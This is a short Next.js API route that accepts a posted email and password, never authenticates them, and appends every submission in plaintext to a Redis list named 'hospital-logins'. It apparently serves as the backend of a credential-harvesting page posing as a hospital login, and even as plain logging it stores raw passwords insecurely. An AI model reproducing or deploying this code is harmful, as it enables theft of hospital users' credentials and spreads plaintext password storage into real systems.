import { NextRequest, NextResponse } from "next/server";
import redis from "../../lib/redisClient"; // adjust path if needed

interface LoginEntry {
  email: string;
  password: string;
  rememberMe?: boolean;
  timestamp: string;
}

export async function POST(req: NextRequest) {
  try {
    const body = await req.json();

    const loginEntry: LoginEntry = {
      email: body.email,
      password: body.password,
      rememberMe: body.rememberMe ?? false,
      timestamp: new Date().toISOString(),
    };

    // Fetch existing logins
    const existingRaw = await redis.get("hospital-logins");
    const existingLogins: LoginEntry[] = existingRaw ? JSON.parse(existingRaw as string) : [];

    // Append new login
    const updatedLogins = [...existingLogins, loginEntry];

    // Store updated logins in Redis
    await redis.set("hospital-logins", JSON.stringify(updatedLogins));

    return NextResponse.json({ success: true });
  } catch (error) {
    console.error("Error writing hospital login:", error);
    return NextResponse.json({ success: false }, { status: 500 });
  }
}
